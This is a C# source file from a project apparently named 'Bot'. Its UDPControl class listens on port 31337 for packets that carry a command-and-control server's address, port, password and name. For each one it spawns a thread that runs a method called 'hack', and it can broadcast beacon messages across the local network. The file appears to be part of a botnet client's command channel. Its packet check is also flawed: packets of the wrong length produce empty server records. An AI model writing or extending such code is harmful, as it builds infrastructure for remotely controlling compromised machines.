using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Bot
{
    class UDPControl
    {
        private UdpClient listener;
        private class CNCInfo
        {
            public string IP { get; set; }
            public UInt16 port { get; set; }
            public string password { get; set; }
            public string name { get; set; }
        }
        public UDPControl()
        {
            listener = new UdpClient(0);
        }

        public UInt16 getPort()
        {
            return Convert.ToUInt16(((IPEndPoint)listener.Client.LocalEndPoint).Port);
        }

        public void listen()
        {
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 31337);

            while (true)
            {
                Byte[] receiveBytes = listener.Receive(ref RemoteIpEndPoint);

                CNCInfo info;
                if ((info = checkData(receiveBytes)) != null)
                {
                    TCPControl x = new TCPControl(info.IP, info.port, info.password, info.name);
                    new Thread(new ThreadStart(x.hack)).Start();
                }
            }

        }

        private CNCInfo checkData(Byte[] receiveBytes)
        {
            try
            {
                CNCInfo info = new CNCInfo();
                if (receiveBytes.Length == 44)
                {

                    IPAddress ipAddress = new IPAddress(new byte[] { receiveBytes[0], receiveBytes[1], receiveBytes[2], receiveBytes[3] });
                    info.IP = ipAddress.ToString();
                    info.port = BitConverter.ToUInt16(new byte[] { receiveBytes[4], receiveBytes[5] }, 0);
                    info.password = Encoding.ASCII.GetString(receiveBytes, 6, 6);
                    info.name = Encoding.ASCII.GetString(receiveBytes, 12, 32);

                }

                return info;
            }
            catch
            {
                return null;
            }
        }


        public void sendRepeatdMessage(Byte[] message, double timeinsec)
        {
            if (message != null && timeinsec >= 0)
            {
                new Thread(new ThreadStart(() =>
                {
                    while (true)
                    {
                        sendMessage(message, "255.255.255.255", 31337);
                        Thread.Sleep(Convert.ToInt32(timeinsec * 1000));
                    }
                }
                )).Start();
            }
        }
        private void sendMessage(Byte[] message, String ipAddress, int port)
        {
            //Byte[] sendBytes = Encoding.ASCII.GetBytes(message);
            //UdpClient broadcast = new UdpClient();
            //broadcast.Send(sendBytes, sendBytes.Length, ipAddress, port);
            listener.Send(message, message.Length, ipAddress, port);
        }
    }
}
